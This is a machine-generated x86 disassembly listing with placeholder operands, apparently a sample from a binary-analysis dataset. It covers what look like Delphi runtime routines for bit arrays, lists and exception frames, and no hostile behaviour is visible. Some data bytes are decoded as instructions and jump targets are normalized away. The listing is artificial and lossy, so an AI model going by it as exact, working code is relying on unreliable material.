push sub_414592
mov eax [ ebp - 0x4 ]
call sub_414598
retn
sub_4145a4
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4145f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4145f8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_4145d4
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026e4
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402ca4
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_402704
mov edx edi
mov eax ebp
call sub_4145ec
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028e0
sub_41469c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_4145d4
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_4145f8
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_4146c8
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_414740
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_41765c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_414780
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414836
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040e8
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031e4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031e4
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41483d
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_41485c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4148f1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031e4
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4042b4
mov eax ebx
mov si 0xffff
call sub_403490
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148f8
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax ebx
mov si 0xffff
call sub_403490
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403490
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4043d0
sub_414903
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4034d0
mov eax ebx
mov si 0xffff
call sub_403490
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403490
push eax
lea eax [ ebx + 0x4 ]
call sub_40568c
mov ecx eax
mov edx r-xdata
pop eax
call sub_403348
sub_41494e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414980
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4149a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403348
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4149c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_40568c
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_403490
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax edi
call sub_40568c
mov edx eax
mov eax esi
call sub_4149c8
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_40568c
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_414a60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_414ab5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_40568c
mov edx eax
mov eax edi
call sub_4149c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414abc
lea eax [ ebp - 0x4 ]
call sub_40568c
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_414ac4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_414afc
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414740
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_414b2c
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_414b68
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031e4
mov edx esp
mov eax esi
call sub_4042b4
add esp 0x100
pop esi
pop ebx
retn
sub_414b90
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_414c25
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_4031e4
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_4042b4
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_403490
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_414b50
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d10
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c2c
lea eax [ ebp - 0x14 ]
call sub_404050
retn
sub_414c43
add [ ebx + 0x53c30440 ] cl
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_415118
mov edx ebx
mov eax esi
call sub_4150b0
sub_414c78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_414b50
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_414264
mov dl 0x1
mov eax ebx
call sub_414b2c
sub_414ca8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_414a60
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_414cf4
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_414a60
mov eax [ esi + 0x8 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414740
test bl bl
jle r-xdata
mov eax esi
call sub_414e0c
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_414d40
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_414d60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41476c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_414dde
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414e0c
mov eax esi
call sub_414eb0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_414eb8
push eax
mov eax [ ebp - 0x4 ]
call sub_414d40
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_414e0c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_414e66
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_414258
call sub_403294
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_414e90
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_414eb8
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_414ecc
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_414f7a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4031e4
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_4042b4
mov eax ebx
mov si 0xffff
call sub_403490
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f81
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
mov eax ebx
mov si 0xffff
call sub_403490
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403490
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_414f94
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4043d0
sub_414f94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_4040a4
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_403490
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034bc
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034bc
call sub_410b60
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026e4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_415091
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034bc
mov edx [ ebp - 0xc ]
call sub_410c8c
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_402704
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_410ce0
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_4042b4
sub_4150b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_403420
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414014
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_414dfc
xor ecx ecx
mov edx esi
mov eax ebx
call sub_414a60
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_4140fc
sub_415118
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_414258
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41430c
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_414060
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_414a60
mov eax ebx
call sub_414dfc
pop edi
pop esi
pop ebx
retn
sub_41517c
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_4151a0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_414ca8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4151e8
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_415dcc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414740
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_415218
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41523c
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_415260
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415307
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4153b0
xor eax eax
push ebp
push sub_4152ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4152f1
mov eax [ ebp - 0x4 ]
call sub_41546c
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_415318
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41476c
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4153b0
xor eax eax
push ebp
push sub_415398
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41546c
retn
sub_4153c8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_415480
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_415420
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_415c64
mov eax [ ebp - 0x8 ]
push eax
push sub_415f14
push ebp
call sub_4153c8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415480
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415515
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41551c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404074
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_40445c
jne r-xdata
sub_41552c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_415528
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
jmp sub_403a08
sub_415564
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4155ac
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405b50
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41552c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4155b3
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_4155bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415694
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4153b0
xor eax eax
push ebp
push sub_415672
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415679
mov eax [ ebp - 0x4 ]
call sub_41546c
retn
sub_4156b0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4156f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404510
call sub_408854
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4156fc
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_415704
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41580f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4040e8
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404140
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415816
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404074
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404310
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404310
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
